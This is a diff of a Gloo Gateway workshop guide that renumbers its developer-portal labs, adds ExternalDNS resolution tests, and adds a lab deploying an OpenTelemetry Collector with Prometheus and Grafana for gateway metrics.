+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
+-->
 
 
 
-## Lab 22 - Expose an external API and stitch it with the productpage API <a name="lab-22---expose-an-external-api-and-stitch-it-with-the-productpage-api-"></a>
+## Lab 27 - Expose an external API and stitch it with the productpage API <a name="lab-27---expose-an-external-api-and-stitch-it-with-the-productpage-api-"></a>
 
 You can also use Gloo Gateway to expose an API that is outside of the cluster. In this section, we will expose `https://openlibrary.org/search.json`
 
@@ -6151,8 +7262,8 @@ describe("Access the openlibrary API", () => {
   it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'language', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid from lab number 22"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 -->
 
 You should see something like this:
@@ -6206,8 +7317,8 @@ describe("Access the openlibrary API with regex", () => {
   it('Checking text \'Rowling\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/authors/OL23919A.json', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'Rowling', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api-regex.test.js.liquid from lab number 22"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api-regex.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 -->
 
 We also need to update the `ApiProduct` object to define a new version targetting the new HTTPRoute:
@@ -6256,7 +7367,7 @@ EOF
 
 
 
-## Lab 23 - Expose the dev portal backend <a name="lab-23---expose-the-dev-portal-backend-"></a>
+## Lab 28 - Expose the dev portal backend <a name="lab-28---expose-the-dev-portal-backend-"></a>
 
 Now that your API has been exposed securely and our plans defined, lets advertise this API through a developer portal.
 
@@ -6386,6 +7497,37 @@ Make sure the domain is in our `/etc/hosts` file:
 ```bash
 ./scripts/register-domain.sh portal.example.com ${PROXY_IP}
 ```
+Since we've deployed ExternalDNS, let us validate that the DNS entry was successfully created in the DNS server. You should get an IP Address as response.
+```bash,norun-workshop
+dig +short @${BIND_CONTAINER_IP} portal.example.com
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const dns = require('dns');
+const chaiHttp = require("chai-http");
+const chai = require("chai");
+const expect = chai.expect;
+chai.use(chaiHttp);
+const { waitOnFailedTest } = require('./tests/utils');
+
+afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
+
+describe("ExternalDNS dns entry validation", () => {
+    it('portal.example.com resolves to ' + process.env.PROXY_IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
+        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
+        return dns.resolve('portal.example.com', (error, address) => {
+            if (!error) {
+                expect(address.toString()).to.be.eq(process.env.PROXY_IP);
+            }
+            done(error);
+        });
+    });
+});
+
+EOF
+echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 28"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 28"; exit 1; }
+-->
 
 You should now be able to access the portal API through the gateway:
 
@@ -6401,8 +7543,8 @@ describe("Access the portal API without authentication", () => {
   it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', body: 'apiProductMetadata', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth.test.js.liquid from lab number 23"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth.test.js.liquid from lab number 28"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 28"; exit 1; }
 -->
 
 Here is the expected output:
@@ -6414,7 +7556,7 @@ Here is the expected output:
 
 
 
-## Lab 24 - Deploy and expose the dev portal frontend <a name="lab-24---deploy-and-expose-the-dev-portal-frontend-"></a>
+## Lab 29 - Deploy and expose the dev portal frontend <a name="lab-29---deploy-and-expose-the-dev-portal-frontend-"></a>
 
 The developer frontend is provided as a fully functional template to allow you to customize it based on your own requirements.
 
@@ -6569,8 +7711,8 @@ describe("Access the portal frontend with authentication", () => {
   it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', headers: [{ key: 'Cookie', value: cookieString }], body: 'apiProductMetadata', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-api-auth.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-api-auth.test.js.liquid from lab number 29"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
 -->
 
 You should now be able to access the portal frontend through the gateway.
@@ -6597,8 +7739,8 @@ describe("Authentication is working properly", function() {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid from lab number 29"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
 -->
 
 If you click on the `LOGIN` button on the top right corner, you'll be redirected to keycloak and should be able to auth with the user `user1` and the password `password`.
@@ -6680,8 +7822,8 @@ describe("Dev portal frontend UI", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests.test.js.liquid from lab number 29"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
 -->
 
 
@@ -6802,8 +7944,8 @@ describe("Dev portal frontend UI", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests-rbac.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests-rbac.test.js.liquid from lab number 29"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
 -->
 
 Let's delete the `PortalGroup` to allow both users to access the `ApiProduct`:
@@ -6815,7 +7957,7 @@ kubectl --context ${CLUSTER1} -n gloo-system delete portalgroups.portal.gloo.sol
 
 
 
-## Lab 25 - Demonstrate the self service capabilities <a name="lab-25---demonstrate-the-self-service-capabilities-"></a>
+## Lab 30 - Demonstrate the self service capabilities <a name="lab-30---demonstrate-the-self-service-capabilities-"></a>
 
 
 We're going to demonstrate how to allow users to create their own teams and applications, subscribe to API Products and get credentials.
@@ -7057,8 +8199,8 @@ describe("Dev portal frontend UI", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests.test.js.liquid from lab number 30"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
 -->
 <!--bash
 export API_KEY=$(cat apiKey)
@@ -7079,8 +8221,8 @@ describe("Access to API unauthorized", () => {
   it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 30"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
 -->
 
 The access is refused (403 response):
@@ -7107,8 +8249,8 @@ describe("Access to API authorized", () => {
   it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 200 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-authorized.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-authorized.test.js.liquid from lab number 30"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
 -->
 
 So, we've secured the access to our API, but you generally want to also limit the usage of your API.
@@ -7199,8 +8341,8 @@ describe("Access to API rate limited", () => {
   it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 429 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-rate-limited.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-rate-limited.test.js.liquid from lab number 30"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
 -->
 
 You should get a `200` response code the first 5 time and a `429` response code after.
@@ -7237,7 +8379,7 @@ We can now configure the Gloo Gateway portal backend to use it:
 helm upgrade -i -n gloo-system \
   gloo-gateway gloo-ee-helm/gloo-ee \
   --create-namespace \
-  --version 1.18.14 \
+  --version 1.19.1 \
   --kube-context ${CLUSTER1} \
   --reuse-values \
   -f -<<EOF
@@ -7389,8 +8531,8 @@ describe("Dev portal frontend UI oauth", function () {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests-oauth.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests-oauth.test.js.liquid from lab number 30"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
 -->
 <!--bash
 export CLIENT_ID=$(cat oauthClient | jq -r .clientId)
@@ -7425,8 +8567,8 @@ describe("Access to API unauthorized", () => {
   it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 30"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
 -->
 
 <!--bash
@@ -7437,8 +8579,8 @@ describe("Access to API rate limited", () => {
   it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.APP_TOKEN}], retCode: 429 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-oauth.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-oauth.test.js.liquid from lab number 30"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
 -->
 
 You should get a `200` response code the first 5 time and a `429` response code after.
@@ -7446,7 +8588,7 @@ You should get a `200` response code the first 5 time and a `429` response code 
 
 
 
-## Lab 26 - Dev portal monetization <a name="lab-26---dev-portal-monetization-"></a>
+## Lab 31 - Dev portal monetization <a name="lab-31---dev-portal-monetization-"></a>
 
 The `portalMetadata` section of the `ApiProduct` objects we've created previously is used to add some metadata in the access logs.
 
@@ -7570,13 +8712,13 @@ describe("Monetization is working", () => {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-monetization/tests/monetization.test.js.liquid from lab number 26"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=150 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-monetization/tests/monetization.test.js.liquid from lab number 31"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=150 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
 -->
 
 
 
-## Lab 27 - Deploy Backstage with the backend plugin <a name="lab-27---deploy-backstage-with-the-backend-plugin-"></a>
+## Lab 32 - Deploy Backstage with the backend plugin <a name="lab-32---deploy-backstage-with-the-backend-plugin-"></a>
 
 Let's deploy Backstage:
 
@@ -7745,9 +8887,239 @@ describe("APIs displayed properly in backstage", function() {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backstage-backend/tests/backstage-apis.test.js.liquid from lab number 27"
-timeout --signal=INT 6m mocha ./test.js --timeout 10000 --retries=250 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backstage-backend/tests/backstage-apis.test.js.liquid from lab number 32"
+timeout --signal=INT 6m mocha ./test.js --timeout 10000 --retries=250 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 32"; exit 1; }
 -->
+Since we've deployed ExternalDNS, let us validate that the DNS entry was successfully created in the DNS server. You should get an IP Address as response.
+```bash,norun-workshop
+dig +short @${BIND_CONTAINER_IP} backstage.example.com
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const dns = require('dns');
+const chaiHttp = require("chai-http");
+const chai = require("chai");
+const expect = chai.expect;
+chai.use(chaiHttp);
+const { waitOnFailedTest } = require('./tests/utils');
+
+afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});
+
+describe("ExternalDNS dns entry validation", () => {
+    it('backstage.example.com resolves to ' + process.env.PROXY_IP + ' by the local test DNS server ' + process.env.BIND_CONTAINER_IP, (done) => {
+        dns.setServers([ process.env.BIND_CONTAINER_IP ]);
+        return dns.resolve('backstage.example.com', (error, address) => {
+            if (!error) {
+                expect(address.toString()).to.be.eq(process.env.PROXY_IP);
+            }
+            done(error);
+        });
+    });
+});
+
+EOF
+echo "executing test ./default/tests/external-dns.test.js.liquid from lab number 32"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=50 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 32"; exit 1; }
+-->
+
+
+
+## Lab 33 - Deploy OpenTelemetry Collector <a name="lab-33---deploy-opentelemetry-collector-"></a>
+
+Having metrics is essential for running applications reliably, and gateways are no exceptions.
+
+Using [OpenTelemetry Collectors](https://github.com/open-telemetry/opentelemetry-collector-contrib) is a nice way to collect, transform, and ship telemetry to your observability backends.
+
+Let's deploy the OSS distribution of OpenTelemetry Collector, and get started!
+
+```bash
+helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
+helm repo update
+
+helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
+--version 0.97.1 \
+--set mode=deployment \
+--set image.repository="otel/opentelemetry-collector-contrib" \
+--set command.name="otelcol-contrib" \
+--namespace=otel \
+--create-namespace \
+-f -<<EOF
+clusterRole:
+  create: true
+  rules:
+  - apiGroups:
+    - ''
+    resources:
+    - 'pods'
+    - 'nodes'
+    verbs:
+    - 'get'
+    - 'list'
+    - 'watch'
+ports:
+  promexporter:
+    enabled: true
+    containerPort: 9099
+    servicePort: 9099
+    protocol: TCP
+config:
+  receivers:
+    prometheus/gloo-dataplane:
+      config:
+        scrape_configs:
+        # Scrape the Gloo Gateway pods
+        - job_name: gloo-gateways
+          honor_labels: true
+          kubernetes_sd_configs:
+          - role: pod
+          relabel_configs:
+            - action: keep
+              regex: kube-gateway
+              source_labels:
+              - __meta_kubernetes_pod_label_gloo
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
+              action: keep
+              regex: true
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
+              action: replace
+              target_label: __metrics_path__
+              regex: (.+)
+            - action: replace
+              source_labels:
+              - __meta_kubernetes_pod_ip
+              - __meta_kubernetes_pod_annotation_prometheus_io_port
+              separator: ':'
+              target_label: __address__
+            - action: labelmap
+              regex: __meta_kubernetes_pod_label_(.+)
+            - source_labels: [__meta_kubernetes_namespace]
+              action: replace
+              target_label: kube_namespace
+            - source_labels: [__meta_kubernetes_pod_name]
+              action: replace
+              target_label: pod
+    prometheus/gloo-controlplane:
+      config:
+        scrape_configs:
+        # Scrape the Gloo pods
+        - job_name: gloo-gateways
+          honor_labels: true
+          kubernetes_sd_configs:
+          - role: pod
+          relabel_configs:
+            - action: keep
+              regex: gloo
+              source_labels:
+              - __meta_kubernetes_pod_label_gloo
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
+              action: keep
+              regex: true
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
+              action: replace
+              target_label: __metrics_path__
+              regex: (.+)
+            - action: replace
+              source_labels:
+              - __meta_kubernetes_pod_ip
+              - __meta_kubernetes_pod_annotation_prometheus_io_port
+              separator: ':'
+              target_label: __address__
+            - action: labelmap
+              regex: __meta_kubernetes_pod_label_(.+)
+            - source_labels: [__meta_kubernetes_namespace]
+              action: replace
+              target_label: kube_namespace
+            - source_labels: [__meta_kubernetes_pod_name]
+              action: replace
+              target_label: pod
+  exporters:
+    prometheus:
+      endpoint: 0.0.0.0:9099
+    debug: {}
+  service:
+    pipelines:
+      metrics:
+        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
+        processors: [batch]
+        exporters: [prometheus]
+EOF
+```
+
+This deployment will now scrape our Gateways' metrics, and expose these metrics in Prometheus format.
+
+While you could scrape the Gateway pods directly as well, that might only work if you only want to consume them from the local cluster. Or, you could be standardizing on OpenTelemetry to avoid vendor/project specific agents. In this case, ingesting the metrics into an OTel Collector can make perfect sense, since you can freely transform telemetry data and ship to the backend of your liking.
+
+For simplicity's sake, let's imagine that our desired backend is a local Prometheus instance. Let's get the telemetry data in to that one!
+
+First, let's install kube-prometheus-stack!
+
+```bash
+helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
+helm repo update
+
+helm upgrade --install kube-prometheus-stack \
+prometheus-community/kube-prometheus-stack \
+--version 61.2.0 \
+--namespace monitoring \
+--create-namespace \
+--values - <<EOF
+grafana:
+  service:
+    type: LoadBalancer
+    port: 3000
+prometheus:
+  prometheusSpec:
+    ruleSelectorNilUsesHelmValues: false
+    serviceMonitorSelectorNilUsesHelmValues: false
+    podMonitorSelectorNilUsesHelmValues: false
+EOF
+```
+
+Finally, configure scraping for our OTel Collector via a PodMonitor!
+
+```bash
+cat <<EOF | kubectl apply -n otel -f -
+apiVersion: monitoring.coreos.com/v1
+kind: PodMonitor
+metadata:
+  name: otel-monitor
+spec:
+  podMetricsEndpoints:
+  - interval: 30s
+    port: promexporter
+    scheme: http
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: opentelemetry-collector
+EOF
+```
+
+Now let's import a sample dashboard!
+
+```bash
+kubectl -n monitoring create cm envoy-dashboard \
+--from-file=data/steps/deploy-otel-collector/envoy.json
+kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
+```
+
+Let's generate some traffic!
+
+```bash,norun-workshop
+for i in {1..5}; do curl https://httpbin.example.com/get -v; done
+```
+
+
+To access Grafana, you need to get the endpoint using the following command:
+
+```bash
+echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):3000"
+```
+
+
+Login with `admin` and `prom-operator` you should be able to see how traffic flows trough your Gateways!
+
+![Envoy dashboard](images/steps/deploy-otel-collector/envoy.png)
+
 
 
 
